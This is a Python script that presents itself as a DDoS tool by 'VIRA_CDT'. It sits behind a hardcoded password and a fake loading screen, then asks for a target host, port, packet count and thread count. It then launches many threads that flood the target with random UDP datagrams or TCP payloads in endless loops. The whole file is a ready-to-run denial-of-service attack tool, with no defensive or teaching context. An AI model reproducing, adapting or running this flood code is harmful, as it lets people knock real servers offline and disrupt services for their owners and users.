import random
import socket
import threading
import time
import os,sys
import random, socket, threading

pasw = "vira_cdt123"

for i in range(3):
    pwd = input(" Password Please : ")
    j = 3
    if (pwd == pasw):
        time.sleep(2)
        print("[0] Loading...")
        time.sleep(1)
        print("[10] Loading...")
        print("[20] Loading...")
        time.sleep(1)
        print("[30] Loading...")
        time.sleep(1)
        print("[40] Loading...")
        time.sleep(1)
        print("[50] Loading...")
        time.sleep(1)
        print("[60] Loading...")
        time.sleep(1)
        print("[70] Loading...")
        time.sleep(1)
        print("[80] Loading...")
        time.sleep(1)
        print("[90] Loading...")
        time.sleep(1)
        print("[100] Processing\n")
        time.sleep(2)
        break
    else:
        time.sleep(2)
        print("[x] salah yaaa wkwk \n")
        continue
time.sleep(2)
print("\033[35m Logged Successful")
time.sleep(2)

os.system("clear")
print("""
\u001b[35m

____  ____   ___  ____    _____ ___   ___  _       ______   __
|  _ \|  _ \ / _ \/ ___|  |_   _/ _ \ / _ \| |     | __ ) \ / /
| | | | | | | | | \___ \    | || | | | | | | |     |  _ \\ V /
| |_| | |_| | |_| |___) |   | || |_| | |_| | |___  | |_) || |
|____/|____/ \___/|____/    |_| \___/ \___/|_____| |____/ |_|


__     _____ ____      _      ____ ____ _____
\ \   / /_ _|  _ \    / \    / ___|  _ \_   _|
 \ \ / / | || |_) |  / _ \  | |   | | | || |
  \ V /  | ||  _ <  / ___ \ | |___| |_| || |
   \_/  |___|_| \_\/_/   \_(_)____|____/ |_|

AUTHOR TOOLS : SCRIPT BY VIRA_CDT
Tool Version: V1.0

Hello Sir :-)""")
print("\033[32m━━━ want attack? (y/n)")
choice = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Host/IP(ex:51.79.166.236)")
ip = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Port(ex:-9955)")
port = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[32m━━━ Pakets")	
print("\033[32m━━━ Min Pakets 100")
times = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Threads")
print("\033[31m━━━ Min Threads are 110")
threads = int(input("┗━>\033[0m:"))
def xxxx():
  data = random._urandom(998)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Attacking Package Activating!")

def xxx():
  data = random._urandom(998)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Attacking Package Activating!")

def xx():
  data = random._urandom(871)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Attacking Package Activating!")

def x():
  data = random._urandom(871)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Attacking Package Activating!")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()
  else:
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()